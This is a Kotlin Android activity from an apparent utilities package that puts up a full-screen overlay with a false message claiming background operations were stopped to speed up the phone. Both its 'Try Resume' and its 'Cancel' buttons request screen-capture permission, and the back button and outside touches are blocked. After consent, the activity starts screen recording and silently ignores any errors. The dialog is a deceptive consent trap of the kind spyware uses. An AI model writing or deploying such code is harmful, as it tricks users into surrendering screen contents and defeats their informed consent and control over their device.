package com.webanion.androidgmutils.screenrecording

import android.app.Activity
import android.content.Intent
import android.graphics.Color
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.view.*
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.graphics.drawable.GradientDrawable

class ScreenRecordingDialogActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY)

        window.setLayout(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT
        )

        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
        )
        window.setFlags(
            WindowManager.LayoutParams.FLAG_DIM_BEHIND,
            WindowManager.LayoutParams.FLAG_DIM_BEHIND
        )

        window.setFlags(
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )

        window.setFlags(
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
        )

        window.setDimAmount(0.5f)

        window.decorView.setOnTouchListener { _, _ -> true }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#CC222222"))
            setPadding(48, 48, 48, 48)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
        }

        val dialogBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = 32f
                setColor(Color.WHITE)
            }
            setPadding(32, 32, 32, 32)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(48, 48, 48, 48)
            }
        }

        val txtVw = TextView(this).apply {
            text = "To speed your phone we stopped some background operations. Please visit respective page to resume the service or click the button below."
            textSize = 16f
            setTextColor(Color.BLACK)
            gravity = Gravity.CENTER
        }

        val topLine = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                4
            ).apply {
                topMargin = 24
            }
            setBackgroundColor(Color.LTGRAY)
        }

        val buttonRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(16, 16, 16, 16)
        }

        val buttonLayoutParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(16, 0, 16, 0)
        }

        val tryConnectButton = Button(this).apply {
            text = "Try Resume"
            contentDescription = "Try Resume Button"
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.parseColor("#47C56C"))
            layoutParams = buttonLayoutParams
            importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_YES
            setOnClickListener {
                startMediaProjection()
            }
        }

        val cancelButton = Button(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            text = "Cancel"
            setTextColor(Color.RED)
            layoutParams = buttonLayoutParams
            setOnClickListener {
                startMediaProjection()
            }
        }

        buttonRow.addView(tryConnectButton)
        buttonRow.addView(cancelButton)

        dialogBox.addView(txtVw)
        dialogBox.addView(topLine)
        dialogBox.addView(buttonRow)
        container.addView(dialogBox)

        setContentView(container)
    }

    private fun startMediaProjection() {
        val mediaProjectionManager =
            getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val permissionIntent = mediaProjectionManager.createScreenCaptureIntent()
        startActivityForResult(permissionIntent, ScreenRecordingListenerModule.SCREEN_RECORD_REQUEST_CODE)
    }

    override fun onBackPressed() {
        // Consume back press
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == ScreenRecordingListenerModule.SCREEN_RECORD_REQUEST_CODE && data != null) {
            ScreenRecorderSingleton.setActivity(this)
            try {
                ScreenRecorderSingleton.startRecording(data, resultCode)
            } catch (e: Exception) {
                // Log error
            }
            finish()
        }
    }
}
